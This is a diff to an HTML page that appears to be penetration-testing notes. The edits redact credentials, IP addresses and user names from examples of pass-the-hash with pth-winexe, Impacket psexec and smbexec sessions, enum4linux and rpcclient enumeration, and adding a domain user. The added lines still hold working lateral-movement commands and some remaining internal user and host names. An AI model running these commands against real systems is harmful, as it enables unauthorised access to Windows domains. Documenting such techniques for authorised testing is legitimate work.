@@ -150,7 +150,7 @@ Options:
 </pre></div>
 </div>
 <p>Example with pth:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="o">./</span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">4</span><span class="n">b579a266f697c2f086d14ab9b208110</span> <span class="o">//</span><span class="mf">10.145</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="o">./</span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">4</span><span class="n">b579a266f697c2xxxxxxxxx</span> <span class="o">//</span><span class="mf">10.145</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
 <span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">EXAMPLE</span><span class="o">/</span><span class="n">Administrator</span><span class="o">%</span><span class="n">example</span><span class="nd">@123</span> <span class="o">//</span><span class="mf">10.145</span><span class="o">.</span><span class="n">X</span><span class="o">.</span><span class="n">X</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
 </pre></div>
 </div>
@@ -261,7 +261,8 @@ Module options are specified with the -o flag. All options are specified in the 
 <h3>Impacket psexec/ smbexe/ wmiexec<a class="headerlink" href="#impacket-psexec-smbexe-wmiexec" title="Permalink to this headline">¶</a></h3>
 <ul>
 <li><p class="first">Impacket psexec</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>./psexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
+<div class="highlight-default"><div class="highlight"><pre><span></span>./psexec.py -debug Admini:Password@10.0.X.X
+
 Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 
 [*] Trying protocol 445/SMB...
@@ -284,7 +285,7 @@ Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 </li>
 </ul>
 <blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>./smbexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>./smbexec.py -debug Admini:Password@10.0.5.180
 
 Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 
@@ -302,9 +303,9 @@ Ethernet adapter Local Area Connection:
 
 Connection-specific DNS Suffix  . :
 Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
-IPv4 Address. . . . . . . . . . . : 10.0.5.180
+IPv4 Address. . . . . . . . . . . : 10.0.X.XX
 Subnet Mask . . . . . . . . . . . : 255.255.254.0
-Default Gateway . . . . . . . . . : 10.0.4.1
+Default Gateway . . . . . . . . . : 10.0.X.1
 
 Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:
 
@@ -513,16 +514,11 @@ user:[cap] rid:[0x589]
 user:[zentrale] rid:[0x67f]
 user:[dbserver] rid:[0x7d9]
 user:[JVOO] rid:[0x7fa]
-user:[arupp] rid:[0x832]
 user:[Standard HMC User Te] rid:[0x8a0]
 user:[event] rid:[0x8d5]
-user:[mrichte] rid:[0x922]
 user:[remote] rid:[0x9ea]
 user:[pda-vis1] rid:[0xb65]
 user:[TestUser] rid:[0xc46]
-user:[zermatt] rid:[0xf03]
-user:[northamerica] rid:[0xf05]
-user:[xxxx-pikett] rid:[0xf90]
 user:[oeinstall] rid:[0x1133]
 user:[repro] rid:[0x13c3]
 </pre></div>
@@ -589,8 +585,8 @@ rid:[0xa26e] attr:[0x7]
 </ul>
 <blockquote>
 <div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; queryuser 0x3601
-User Name   :   mahodel_s
-Full Name   :   Martin Hodel
+User Name   :   dummy_s
+Full Name   :   Dummy User
 Home Drive  :
 Dir Drive   :
 Profile Path:
@@ -671,7 +667,7 @@ min_password_length: 8
    <span class="o">-</span><span class="n">v</span>        <span class="n">Verbose</span><span class="o">.</span>  <span class="n">Shows</span> <span class="n">full</span> <span class="n">commands</span> <span class="n">being</span> <span class="n">run</span> <span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">rpcclient</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span><span class="p">)</span>
 </pre></div>
 </div>
-<div class="highlight-default"><div class="highlight"><pre><span></span>enum4linux -P -d xxxx.abcxxx.net -u mluesch -p threE333\$\$ 10.0.65.103
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enum4linux</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">d</span> <span class="n">xxxx</span><span class="o">.</span><span class="n">abcxxx</span><span class="o">.</span><span class="n">net</span> <span class="o">-</span><span class="n">u</span> <span class="n">mluxxxx</span> <span class="o">-</span><span class="n">p</span> <span class="n">threxxxx</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
 </pre></div>
 </div>
 </div>
@@ -707,10 +703,9 @@ min_password_length: 8
 <span class="n">Type</span> <span class="n">a</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">user</span><span class="p">:</span>
 <span class="n">Retype</span> <span class="n">the</span> <span class="n">password</span> <span class="n">to</span> <span class="n">confirm</span><span class="p">:</span>
 <span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
-
-<span class="n">Add</span> <span class="n">a</span> <span class="n">domain</span> <span class="n">user</span>
 </pre></div>
 </div>
+<p>Add a domain user</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="n">username</span> <span class="n">password</span> <span class="o">/</span><span class="n">ADD</span> <span class="o">/</span><span class="n">DOMAIN</span>
 </pre></div>
 </div>
